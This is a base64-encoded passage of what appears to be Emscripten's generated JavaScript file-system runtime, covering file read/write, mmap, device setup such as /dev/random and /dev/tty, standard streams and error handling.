b2RlLm1vZGUpKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMzEpOw0KICAgICAgICB9DQogICAgICAgIGlmICghc3RyZWFtLnN0cmVhbV9vcHMud3JpdGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHN0cmVhbS5zZWVrYWJsZSAmJiBzdHJlYW0uZmxhZ3MgJiAxMDI0KSB7DQogICAgICAgICAgLy8gc2VlayB0byB0aGUgZW5kIGJlZm9yZSB3cml0aW5nIGluIGFwcGVuZCBtb2RlDQogICAgICAgICAgRlMubGxzZWVrKHN0cmVhbSwgMCwgMik7DQogICAgICAgIH0NCiAgICAgICAgdmFyIHNlZWtpbmcgPSB0eXBlb2YgcG9zaXRpb24gIT09ICd1bmRlZmluZWQnOw0KICAgICAgICBpZiAoIXNlZWtpbmcpIHsNCiAgICAgICAgICBwb3NpdGlvbiA9IHN0cmVhbS5wb3NpdGlvbjsNCiAgICAgICAgfSBlbHNlIGlmICghc3RyZWFtLnNlZWthYmxlKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNzApOw0KICAgICAgICB9DQogICAgICAgIHZhciBieXRlc1dyaXR0ZW4gPSBzdHJlYW0uc3RyZWFtX29wcy53cml0ZShzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uLCBjYW5Pd24pOw0KICAgICAgICBpZiAoIXNlZWtpbmcpIHN0cmVhbS5wb3NpdGlvbiArPSBieXRlc1dyaXR0ZW47DQogICAgICAgIHRyeSB7DQogICAgICAgICAgaWYgKHN0cmVhbS5wYXRoICYmIEZTLnRyYWNraW5nRGVsZWdhdGVbJ29uV3JpdGVUb0ZpbGUnXSkgRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25Xcml0ZVRvRmlsZSddKHN0cmVhbS5wYXRoKTsNCiAgICAgICAgfSBjYXRjaChlKSB7DQogICAgICAgICAgZXJyKCJGUy50cmFja2luZ0RlbGVnYXRlWydvbldyaXRlVG9GaWxlJ10oJyIrc3RyZWFtLnBhdGgrIicpIHRocmV3IGFuIGV4Y2VwdGlvbjogIiArIGUubWVzc2FnZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGJ5dGVzV3JpdHRlbjsNCiAgICAgIH0sYWxsb2NhdGU6ZnVuY3Rpb24oc3RyZWFtLCBvZmZzZXQsIGxlbmd0aCkgew0KICAgICAgICBpZiAoRlMuaXNDbG9zZWQoc3RyZWFtKSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChvZmZzZXQgPCAwIHx8IGxlbmd0aCA8PSAwKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICB9DQogICAgICAgIGlmICgoc3RyZWFtLmZsYWdzICYgMjA5NzE1NSkgPT09IDApIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig4KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIUZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSAmJiAhRlMuaXNEaXIoc3RyZWFtLm5vZGUubW9kZSkpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig0Myk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFzdHJlYW0uc3RyZWFtX29wcy5hbGxvY2F0ZSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDEzOCk7DQogICAgICAgIH0NCiAgICAgICAgc3RyZWFtLnN0cmVhbV9vcHMuYWxsb2NhdGUoc3RyZWFtLCBvZmZzZXQsIGxlbmd0aCk7DQogICAgICB9LG1tYXA6ZnVuY3Rpb24oc3RyZWFtLCBhZGRyZXNzLCBsZW5ndGgsIHBvc2l0aW9uLCBwcm90LCBmbGFncykgew0KICAgICAgICAvLyBVc2VyIHJlcXVlc3RzIHdyaXRpbmcgdG8gZmlsZSAocHJvdCAmIFBST1RfV1JJVEUgIT0gMCkuDQogICAgICAgIC8vIENoZWNraW5nIGlmIHdlIGhhdmUgcGVybWlzc2lvbnMgdG8gd3JpdGUgdG8gdGhlIGZpbGUgdW5sZXNzDQogICAgICAgIC8vIE1BUF9QUklWQVRFIGZsYWcgaXMgc2V0LiBBY2NvcmRpbmcgdG8gUE9TSVggc3BlYyBpdCBpcyBwb3NzaWJsZQ0KICAgICAgICAvLyB0byB3cml0ZSB0byBmaWxlIG9wZW5lZCBpbiByZWFkLW9ubHkgbW9kZSB3aXRoIE1BUF9QUklWQVRFIGZsYWcsDQogICAgICAgIC8vIGFzIGFsbCBtb2RpZmljYXRpb25zIHdpbGwgYmUgdmlzaWJsZSBvbmx5IGluIHRoZSBtZW1vcnkgb2YNCiAgICAgICAgLy8gdGhlIGN1cnJlbnQgcHJvY2Vzcy4NCiAgICAgICAgaWYgKChwcm90ICYgMikgIT09IDANCiAgICAgICAgICAgICYmIChmbGFncyAmIDIpID09PSAwDQogICAgICAgICAgICAmJiAoc3RyZWFtLmZsYWdzICYgMjA5NzE1NSkgIT09IDIpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoKHN0cmVhbS5mbGFncyAmIDIwOTcxNTUpID09PSAxKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMik7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFzdHJlYW0uc3RyZWFtX29wcy5tbWFwKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNDMpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBzdHJlYW0uc3RyZWFtX29wcy5tbWFwKHN0cmVhbSwgYWRkcmVzcywgbGVuZ3RoLCBwb3NpdGlvbiwgcHJvdCwgZmxhZ3MpOw0KICAgICAgfSxtc3luYzpmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIG1tYXBGbGFncykgew0KICAgICAgICBpZiAoIXN0cmVhbSB8fCAhc3RyZWFtLnN0cmVhbV9vcHMubXN5bmMpIHsNCiAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gc3RyZWFtLnN0cmVhbV9vcHMubXN5bmMoc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBtbWFwRmxhZ3MpOw0KICAgICAgfSxtdW5tYXA6ZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfSxpb2N0bDpmdW5jdGlvbihzdHJlYW0sIGNtZCwgYXJnKSB7DQogICAgICAgIGlmICghc3RyZWFtLnN0cmVhbV9vcHMuaW9jdGwpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig1OSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHN0cmVhbS5zdHJlYW1fb3BzLmlvY3RsKHN0cmVhbSwgY21kLCBhcmcpOw0KICAgICAgfSxyZWFkRmlsZTpmdW5jdGlvbihwYXRoLCBvcHRzKSB7DQogICAgICAgIG9wdHMgPSBvcHRzIHx8IHt9Ow0KICAgICAgICBvcHRzLmZsYWdzID0gb3B0cy5mbGFncyB8fCAncic7DQogICAgICAgIG9wdHMuZW5jb2RpbmcgPSBvcHRzLmVuY29kaW5nIHx8ICdiaW5hcnknOw0KICAgICAgICBpZiAob3B0cy5lbmNvZGluZyAhPT0gJ3V0ZjgnICYmIG9wdHMuZW5jb2RpbmcgIT09ICdiaW5hcnknKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdJbnZhbGlkIGVuY29kaW5nIHR5cGUgIicgKyBvcHRzLmVuY29kaW5nICsgJyInKTsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgcmV0Ow0KICAgICAgICB2YXIgc3RyZWFtID0gRlMub3BlbihwYXRoLCBvcHRzLmZsYWdzKTsNCiAgICAgICAgdmFyIHN0YXQgPSBGUy5zdGF0KHBhdGgpOw0KICAgICAgICB2YXIgbGVuZ3RoID0gc3RhdC5zaXplOw0KICAgICAgICB2YXIgYnVmID0gbmV3IFVpbnQ4QXJyYXkobGVuZ3RoKTsNCiAgICAgICAgRlMucmVhZChzdHJlYW0sIGJ1ZiwgMCwgbGVuZ3RoLCAwKTsNCiAgICAgICAgaWYgKG9wdHMuZW5jb2RpbmcgPT09ICd1dGY4Jykgew0KICAgICAgICAgIHJldCA9IFVURjhBcnJheVRvU3RyaW5nKGJ1ZiwgMCk7DQogICAgICAgIH0gZWxzZSBpZiAob3B0cy5lbmNvZGluZyA9PT0gJ2JpbmFyeScpIHsNCiAgICAgICAgICByZXQgPSBidWY7DQogICAgICAgIH0NCiAgICAgICAgRlMuY2xvc2Uoc3RyZWFtKTsNCiAgICAgICAgcmV0dXJuIHJldDsNCiAgICAgIH0sd3JpdGVGaWxlOmZ1bmN0aW9uKHBhdGgsIGRhdGEsIG9wdHMpIHsNCiAgICAgICAgb3B0cyA9IG9wdHMgfHwge307DQogICAgICAgIG9wdHMuZmxhZ3MgPSBvcHRzLmZsYWdzIHx8ICd3JzsNCiAgICAgICAgdmFyIHN0cmVhbSA9IEZTLm9wZW4ocGF0aCwgb3B0cy5mbGFncywgb3B0cy5tb2RlKTsNCiAgICAgICAgaWYgKHR5cGVvZiBkYXRhID09PSAnc3RyaW5nJykgew0KICAgICAgICAgIHZhciBidWYgPSBuZXcgVWludDhBcnJheShsZW5ndGhCeXRlc1VURjgoZGF0YSkrMSk7DQogICAgICAgICAgdmFyIGFjdHVhbE51bUJ5dGVzID0gc3RyaW5nVG9VVEY4QXJyYXkoZGF0YSwgYnVmLCAwLCBidWYubGVuZ3RoKTsNCiAgICAgICAgICBGUy53cml0ZShzdHJlYW0sIGJ1ZiwgMCwgYWN0dWFsTnVtQnl0ZXMsIHVuZGVmaW5lZCwgb3B0cy5jYW5Pd24pOw0KICAgICAgICB9IGVsc2UgaWYgKEFycmF5QnVmZmVyLmlzVmlldyhkYXRhKSkgew0KICAgICAgICAgIEZTLndyaXRlKHN0cmVhbSwgZGF0YSwgMCwgZGF0YS5ieXRlTGVuZ3RoLCB1bmRlZmluZWQsIG9wdHMuY2FuT3duKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ1Vuc3VwcG9ydGVkIGRhdGEgdHlwZScpOw0KICAgICAgICB9DQogICAgICAgIEZTLmNsb3NlKHN0cmVhbSk7DQogICAgICB9LGN3ZDpmdW5jdGlvbigpIHsNCiAgICAgICAgcmV0dXJuIEZTLmN1cnJlbnRQYXRoOw0KICAgICAgfSxjaGRpcjpmdW5jdGlvbihwYXRoKSB7DQogICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiB0cnVlIH0pOw0KICAgICAgICBpZiAobG9va3VwLm5vZGUgPT09IG51bGwpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig0NCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFGUy5pc0Rpcihsb29rdXAubm9kZS5tb2RlKSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDU0KTsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm5vZGVQZXJtaXNzaW9ucyhsb29rdXAubm9kZSwgJ3gnKTsNCiAgICAgICAgaWYgKGVyckNvZGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnJDb2RlKTsNCiAgICAgICAgfQ0KICAgICAgICBGUy5jdXJyZW50UGF0aCA9IGxvb2t1cC5wYXRoOw0KICAgICAgfSxjcmVhdGVEZWZhdWx0RGlyZWN0b3JpZXM6ZnVuY3Rpb24oKSB7DQogICAgICAgIEZTLm1rZGlyKCcvdG1wJyk7DQogICAgICAgIEZTLm1rZGlyKCcvaG9tZScpOw0KICAgICAgICBGUy5ta2RpcignL2hvbWUvd2ViX3VzZXInKTsNCiAgICAgIH0sY3JlYXRlRGVmYXVsdERldmljZXM6ZnVuY3Rpb24oKSB7DQogICAgICAgIC8vIGNyZWF0ZSAvZGV2DQogICAgICAgIEZTLm1rZGlyKCcvZGV2Jyk7DQogICAgICAgIC8vIHNldHVwIC9kZXYvbnVsbA0KICAgICAgICBGUy5yZWdpc3RlckRldmljZShGUy5tYWtlZGV2KDEsIDMpLCB7DQogICAgICAgICAgcmVhZDogZnVuY3Rpb24oKSB7IHJldHVybiAwOyB9LA0KICAgICAgICAgIHdyaXRlOiBmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvcykgeyByZXR1cm4gbGVuZ3RoOyB9DQogICAgICAgIH0pOw0KICAgICAgICBGUy5ta2RldignL2Rldi9udWxsJywgRlMubWFrZWRldigxLCAzKSk7DQogICAgICAgIC8vIHNldHVwIC9kZXYvdHR5IGFuZCAvZGV2L3R0eTENCiAgICAgICAgLy8gc3RkZXJyIG5lZWRzIHRvIHByaW50IG91dHB1dCB1c2luZyBNb2R1bGVbJ3ByaW50RXJyJ10NCiAgICAgICAgLy8gc28gd2UgcmVnaXN0ZXIgYSBzZWNvbmQgdHR5IGp1c3QgZm9yIGl0Lg0KICAgICAgICBUVFkucmVnaXN0ZXIoRlMubWFrZWRldig1LCAwKSwgVFRZLmRlZmF1bHRfdHR5X29wcyk7DQogICAgICAgIFRUWS5yZWdpc3RlcihGUy5tYWtlZGV2KDYsIDApLCBUVFkuZGVmYXVsdF90dHkxX29wcyk7DQogICAgICAgIEZTLm1rZGV2KCcvZGV2L3R0eScsIEZTLm1ha2VkZXYoNSwgMCkpOw0KICAgICAgICBGUy5ta2RldignL2Rldi90dHkxJywgRlMubWFrZWRldig2LCAwKSk7DQogICAgICAgIC8vIHNldHVwIC9kZXYvW3VdcmFuZG9tDQogICAgICAgIHZhciByYW5kb21fZGV2aWNlOw0KICAgICAgICBpZiAodHlwZW9mIGNyeXB0byA9PT0gJ29iamVjdCcgJiYgdHlwZW9mIGNyeXB0b1snZ2V0UmFuZG9tVmFsdWVzJ10gPT09ICdmdW5jdGlvbicpIHsNCiAgICAgICAgICAvLyBmb3IgbW9kZXJuIHdlYiBicm93c2Vycw0KICAgICAgICAgIHZhciByYW5kb21CdWZmZXIgPSBuZXcgVWludDhBcnJheSgxKTsNCiAgICAgICAgICByYW5kb21fZGV2aWNlID0gZnVuY3Rpb24oKSB7IGNyeXB0by5nZXRSYW5kb21WYWx1ZXMocmFuZG9tQnVmZmVyKTsgcmV0dXJuIHJhbmRvbUJ1ZmZlclswXTsgfTsNCiAgICAgICAgfSBlbHNlDQogICAgICAgIGlmIChFTlZJUk9OTUVOVF9JU19OT0RFKSB7DQogICAgICAgICAgLy8gZm9yIG5vZGVqcyB3aXRoIG9yIHdpdGhvdXQgY3J5cHRvIHN1cHBvcnQgaW5jbHVkZWQNCiAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgdmFyIGNyeXB0b19tb2R1bGUgPSByZXF1aXJlKCdjcnlwdG8nKTsNCiAgICAgICAgICAgIC8vIG5vZGVqcyBoYXMgY3J5cHRvIHN1cHBvcnQNCiAgICAgICAgICAgIHJhbmRvbV9kZXZpY2UgPSBmdW5jdGlvbigpIHsgcmV0dXJuIGNyeXB0b19tb2R1bGVbJ3JhbmRvbUJ5dGVzJ10oMSlbMF07IH07DQogICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgLy8gbm9kZWpzIGRvZXNuJ3QgaGF2ZSBjcnlwdG8gc3VwcG9ydA0KICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlDQogICAgICAgIHt9DQogICAgICAgIGlmICghcmFuZG9tX2RldmljZSkgew0KICAgICAgICAgIC8vIHdlIGNvdWxkbid0IGZpbmQgYSBwcm9wZXIgaW1wbGVtZW50YXRpb24sIGFzIE1hdGgucmFuZG9tKCkgaXMgbm90IHN1aXRhYmxlIGZvciAvZGV2L3JhbmRvbSwgc2VlIGVtc2NyaXB0ZW4tY29yZS9lbXNjcmlwdGVuL3B1bGwvNzA5Ng0KICAgICAgICAgIHJhbmRvbV9kZXZpY2UgPSBmdW5jdGlvbigpIHsgYWJvcnQoIm5vIGNyeXB0b2dyYXBoaWMgc3VwcG9ydCBmb3VuZCBmb3IgcmFuZG9tX2RldmljZS4gY29uc2lkZXIgcG9seWZpbGxpbmcgaXQgaWYgeW91IHdhbnQgdG8gdXNlIHNvbWV0aGluZyBpbnNlY3VyZSBsaWtlIE1hdGgucmFuZG9tKCksIGUuZy4gcHV0IHRoaXMgaW4gYSAtLXByZS1qczogdmFyIGNyeXB0byA9IHsgZ2V0UmFuZG9tVmFsdWVzOiBmdW5jdGlvbihhcnJheSkgeyBmb3IgKHZhciBpID0gMDsgaSA8IGFycmF5Lmxlbmd0aDsgaSsrKSBhcnJheVtpXSA9IChNYXRoLnJhbmRvbSgpKjI1Nil8MCB9IH07Iik7IH07DQogICAgICAgIH0NCiAgICAgICAgRlMuY3JlYXRlRGV2aWNlKCcvZGV2JywgJ3JhbmRvbScsIHJhbmRvbV9kZXZpY2UpOw0KICAgICAgICBGUy5jcmVhdGVEZXZpY2UoJy9kZXYnLCAndXJhbmRvbScsIHJhbmRvbV9kZXZpY2UpOw0KICAgICAgICAvLyB3ZSdyZSBub3QgZ29pbmcgdG8gZW11bGF0ZSB0aGUgYWN0dWFsIHNobSBkZXZpY2UsDQogICAgICAgIC8vIGp1c3QgY3JlYXRlIHRoZSB0bXAgZGlycyB0aGF0IHJlc2lkZSBpbiBpdCBjb21tb25seQ0KICAgICAgICBGUy5ta2RpcignL2Rldi9zaG0nKTsNCiAgICAgICAgRlMubWtkaXIoJy9kZXYvc2htL3RtcCcpOw0KICAgICAgfSxjcmVhdGVTcGVjaWFsRGlyZWN0b3JpZXM6ZnVuY3Rpb24oKSB7DQogICAgICAgIC8vIGNyZWF0ZSAvcHJvYy9zZWxmL2ZkIHdoaWNoIGFsbG93cyAvcHJvYy9zZWxmL2ZkLzYgPT4gcmVhZGxpbmsgZ2l2ZXMgdGhlIG5hbWUgb2YgdGhlIHN0cmVhbSBmb3IgZmQgNiAoc2VlIHRlc3RfdW5pc3RkX3R0eW5hbWUpDQogICAgICAgIEZTLm1rZGlyKCcvcHJvYycpOw0KICAgICAgICBGUy5ta2RpcignL3Byb2Mvc2VsZicpOw0KICAgICAgICBGUy5ta2RpcignL3Byb2Mvc2VsZi9mZCcpOw0KICAgICAgICBGUy5tb3VudCh7DQogICAgICAgICAgbW91bnQ6IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgdmFyIG5vZGUgPSBGUy5jcmVhdGVOb2RlKCcvcHJvYy9zZWxmJywgJ2ZkJywgMTYzODQgfCA1MTEgLyogMDc3NyAqLywgNzMpOw0KICAgICAgICAgICAgbm9kZS5ub2RlX29wcyA9IHsNCiAgICAgICAgICAgICAgbG9va3VwOiBmdW5jdGlvbihwYXJlbnQsIG5hbWUpIHsNCiAgICAgICAgICAgICAgICB2YXIgZmQgPSArbmFtZTsNCiAgICAgICAgICAgICAgICB2YXIgc3RyZWFtID0gRlMuZ2V0U3RyZWFtKGZkKTsNCiAgICAgICAgICAgICAgICBpZiAoIXN0cmVhbSkgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoOCk7DQogICAgICAgICAgICAgICAgdmFyIHJldCA9IHsNCiAgICAgICAgICAgICAgICAgIHBhcmVudDogbnVsbCwNCiAgICAgICAgICAgICAgICAgIG1vdW50OiB7IG1vdW50cG9pbnQ6ICdmYWtlJyB9LA0KICAgICAgICAgICAgICAgICAgbm9kZV9vcHM6IHsgcmVhZGxpbms6IGZ1bmN0aW9uKCkgeyByZXR1cm4gc3RyZWFtLnBhdGggfSB9DQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICByZXQucGFyZW50ID0gcmV0OyAvLyBtYWtlIGl0IGxvb2sgbGlrZSBhIHNpbXBsZSByb290IG5vZGUNCiAgICAgICAgICAgICAgICByZXR1cm4gcmV0Ow0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgcmV0dXJuIG5vZGU7DQogICAgICAgICAgfQ0KICAgICAgICB9LCB7fSwgJy9wcm9jL3NlbGYvZmQnKTsNCiAgICAgIH0sY3JlYXRlU3RhbmRhcmRTdHJlYW1zOmZ1bmN0aW9uKCkgew0KICAgICAgICAvLyBUT0RPIGRlcHJlY2F0ZSB0aGUgb2xkIGZ1bmN0aW9uYWxpdHkgb2YgYSBzaW5nbGUNCiAgICAgICAgLy8gaW5wdXQgLyBvdXRwdXQgY2FsbGJhY2sgYW5kIHRoYXQgdXRpbGl6ZXMgRlMuY3JlYXRlRGV2aWNlDQogICAgICAgIC8vIGFuZCBpbnN0ZWFkIHJlcXVpcmUgYSB1bmlxdWUgc2V0IG9mIHN0cmVhbSBvcHMNCiAgDQogICAgICAgIC8vIGJ5IGRlZmF1bHQsIHdlIHN5bWxpbmsgdGhlIHN0YW5kYXJkIHN0cmVhbXMgdG8gdGhlDQogICAgICAgIC8vIGRlZmF1bHQgdHR5IGRldmljZXMuIGhvd2V2ZXIsIGlmIHRoZSBzdGFuZGFyZCBzdHJlYW1zDQogICAgICAgIC8vIGhhdmUgYmVlbiBvdmVyd3JpdHRlbiB3ZSBjcmVhdGUgYSB1bmlxdWUgZGV2aWNlIGZvcg0KICAgICAgICAvLyB0aGVtIGluc3RlYWQuDQogICAgICAgIGlmIChNb2R1bGVbJ3N0ZGluJ10pIHsNCiAgICAgICAgICBGUy5jcmVhdGVEZXZpY2UoJy9kZXYnLCAnc3RkaW4nLCBNb2R1bGVbJ3N0ZGluJ10pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIEZTLnN5bWxpbmsoJy9kZXYvdHR5JywgJy9kZXYvc3RkaW4nKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoTW9kdWxlWydzdGRvdXQnXSkgew0KICAgICAgICAgIEZTLmNyZWF0ZURldmljZSgnL2RldicsICdzdGRvdXQnLCBudWxsLCBNb2R1bGVbJ3N0ZG91dCddKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICBGUy5zeW1saW5rKCcvZGV2L3R0eScsICcvZGV2L3N0ZG91dCcpOw0KICAgICAgICB9DQogICAgICAgIGlmIChNb2R1bGVbJ3N0ZGVyciddKSB7DQogICAgICAgICAgRlMuY3JlYXRlRGV2aWNlKCcvZGV2JywgJ3N0ZGVycicsIG51bGwsIE1vZHVsZVsnc3RkZXJyJ10pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIEZTLnN5bWxpbmsoJy9kZXYvdHR5MScsICcvZGV2L3N0ZGVycicpOw0KICAgICAgICB9DQogIA0KICAgICAgICAvLyBvcGVuIGRlZmF1bHQgc3RyZWFtcyBmb3IgdGhlIHN0ZGluLCBzdGRvdXQgYW5kIHN0ZGVyciBkZXZpY2VzDQogICAgICAgIHZhciBzdGRpbiA9IEZTLm9wZW4oJy9kZXYvc3RkaW4nLCAncicpOw0KICAgICAgICB2YXIgc3Rkb3V0ID0gRlMub3BlbignL2Rldi9zdGRvdXQnLCAndycpOw0KICAgICAgICB2YXIgc3RkZXJyID0gRlMub3BlbignL2Rldi9zdGRlcnInLCAndycpOw0KICAgICAgICBhc3NlcnQoc3RkaW4uZmQgPT09IDAsICdpbnZhbGlkIGhhbmRsZSBmb3Igc3RkaW4gKCcgKyBzdGRpbi5mZCArICcpJyk7DQogICAgICAgIGFzc2VydChzdGRvdXQuZmQgPT09IDEsICdpbnZhbGlkIGhhbmRsZSBmb3Igc3Rkb3V0ICgnICsgc3Rkb3V0LmZkICsgJyknKTsNCiAgICAgICAgYXNzZXJ0KHN0ZGVyci5mZCA9PT0gMiwgJ2ludmFsaWQgaGFuZGxlIGZvciBzdGRlcnIgKCcgKyBzdGRlcnIuZmQgKyAnKScpOw0KICAgICAgfSxlbnN1cmVFcnJub0Vycm9yOmZ1bmN0aW9uKCkgew0KICAgICAgICBpZiAoRlMuRXJybm9FcnJvcikgcmV0dXJuOw0KICAgICAgICBGUy5FcnJub0Vycm9yID0gLyoqIEB0aGlze09iamVjdH0gKi8gZnVuY3Rpb24gRXJybm9FcnJvcihlcnJubywgbm9kZSkgew0KICAgICAgICAgIHRoaXMubm9kZSA9IG5vZGU7DQogICAgICAgICAgdGhpcy5zZXRFcnJubyA9IC8qKiBAdGhpc3tPYmplY3R9ICovIGZ1bmN0aW9uKGVycm5vKSB7DQogICAgICAgICAgICB0aGlzLmVycm5vID0gZXJybm87DQogICAgICAgICAgICBmb3IgKHZhciBrZXkgaW4gRVJSTk9fQ09ERVMpIHsNCiAgICAgICAgICAgICAgaWYgKEVSUk5PX0NPREVTW2tleV0gPT09IGVycm5vKSB7DQogICAgICAgICAgICAgICAgdGhpcy5jb2RlID0ga2V5Ow0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgfTsNCiAgICAgICAgICB0aGlzLnNldEVycm5vKGVycm5vKTsNCiAgICAgICAgICB0aGlzLm1lc3NhZ2UgPSBFUlJOT19NRVNTQUdFU1tlcnJub107DQogIA0KICAgICAgICAgIC8vIFRyeSB0byBnZXQgYSBtYXhpbWFsbHkgaGVscGZ1bCBzdGFjayB0cmFjZS4gT24gTm9kZS5qcywgZ2V0dGluZyBFcnJvci5zdGFjaw0KICAgICAgICAgIC8vIG5vdyBlbnN1cmVzIGl0IHNob3dzIHdoYXQgd2Ugd2FudC4NCiAgICAgICAgICBpZiAodGhpcy5zdGFjaykgew0KICAgICAgICAgICAgLy8gRGVmaW5lIHRoZSBzdGFjayBwcm9wZXJ0eSBmb3IgTm9kZS5qcyA0LCB3aGljaCBvdGhlcndpc2UgZXJyb3JzIG9uIHRoZSBuZXh0IGxpbmUuDQogICAgICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydHkodGhpcywgInN0YWNrIiwgeyB2YWx1ZTogKG5ldyBFcnJvcikuc3RhY2ssIHdyaXRhYmxlOiB0cnVlIH0pOw0KICAgICAgICAgICAgdGhpcy5zdGFjayA9IGRlbWFuZ2xlQWxsKHRoaXMuc3RhY2spOw0KICAgICAgICAgIH0NCiAgICAgICAgfTsNCiAgICAgICAgRlMuRXJybm9FcnJvci5wcm90b3R5cGUgPSBuZXcgRXJyb3IoKTsNCiAgICAgICAgRlMuRXJybm9FcnJvci5wcm90b3R5cGUuY29uc3RydWN0b3IgPSBGUy5FcnJub0Vycm9yOw0KICAgICAgICAvLyBTb21lIGVycm9ycyBtYXkgaGFwcGVuIHF1aXRlIGEgYml0LCB0byBhdm9pZCBvdmVyaGVhZCB3ZSByZXVzZSB0aGVtIChhbmQgc3VmZmVyIGEgbGFjayBvZiBzdGFjayBpbmZvKQ0KICAgICAgICBbNDRdLmZvckVhY2goZnVuY3Rpb24oY29kZSkgew0KICAgICAgICAgIEZTLmdlbmVyaWNFcnJvcnNbY29kZV0gPSBuZXcgRlMuRXJybm9FcnJvcihjb2RlKTsNCiAgICAgICAgICBGUy5nZW5lcmljRXJyb3JzW2NvZGVdLnN0YWNrID0gJzxnZW5lcmljIGVycm9yLCBubyBzdGFjaz4nOw0KICAgICAgICB9KTsNCiAgICAgIH0sc3RhdGljSW5pdDpmdW5jdGlvbigpIHsNCiAgICAgICAgRlMuZW5zdXJlRXJybm9FcnJvcigpOw0KICANCiAgICAgICAgRlMubmFtZVRhYmxlID0gbmV3IEFycmF5KDQwOTYpOw0KICANCiAgICAgICAgRlMubW91bnQoTUVNRlMsIHt9LCAnLycpOw0KICANCiAgICAgICAgRlMuY3JlYXRlRGVmYXVsdERpcmVjdG9yaWVzKCk7DQogICAgICAgIEZTLmNyZWF0ZURlZmF1bHREZXZpY2VzKCk7DQogICAgICAgIEZTLmNyZWF0ZVNwZWNpYWxEaXJlY3RvcmllcygpOw0KICANCiAgICAgICAgRlMuZmlsZXN5c3RlbXMgPSB7DQogICAgICAgICAgJ01FTUZTJzogTUVNRlMsDQogICAgICAgIH07DQogICAgICB9LGluaXQ6ZnVuY3Rpb24oaW5wdXQsIG91dHB1dCwgZXJyb3IpIHsNCiAgICAgICAgYXNzZXJ0KCFGUy5pbml0LmluaXRpYWxpemVkLCAnRlMuaW5pdCB3YXMgcHJldmlvdXNseSBjYWxsZWQuIElmIHlvdSB3YW50IHRvIGluaXRpYWxpemUgbGF0ZXIgd2l0aCBjdXN0b20gcGFyYW1ldGVycywgcmVtb3ZlIGFueSBlYXJsaWVyIGNhbGxzIChub3RlIHRoYXQgb25lIGlzIGF1dG9tYXRpY2FsbHkgYWRkZWQgdG8gdGhlIGdlbmVyYXRlZCBjb2RlKScpOw0KICAgICAgICBGUy5pbml0LmluaXRpYWxpemVkID0gdHJ1ZTsNCiAgDQogICAgICAgIEZTLmVuc3VyZUVycm5vRXJyb3IoKTsNCiAgDQogICAgICAgIC8vIEFsbG93IE1vZHVsZS5zdGRpbiBldGMuIHRvIHByb3ZpZGUgZGVmYXVsdHMsIGlmIG5vbmUgZXhwbGljaXRseSBwYXNzZWQgdG8gdXMgaGVyZQ0KICAgICAgICBNb2R1bGVbJ3N0ZGluJ10gPSBpbnB1dCB8fC